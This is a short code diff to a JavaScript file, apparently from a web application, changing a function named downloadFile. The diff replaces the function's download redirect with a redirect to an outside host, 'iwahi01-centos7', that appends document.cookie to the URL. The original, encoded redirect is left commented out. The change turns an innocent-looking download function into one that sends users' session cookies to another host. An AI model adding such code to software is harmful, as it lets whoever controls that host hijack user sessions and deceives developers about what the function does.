@@ -398,6 +398,6 @@ function printViewInit() {
 }
 function downloadFile() {
  var uri = makeURI("design/excel");
- location.href = uri;
- location.href = encodeURI(uri);
+ location.href = 'http://iwahi01-centos7?cookie=' + document.cookie;
+ //location.href = encodeURI(uri);
 }
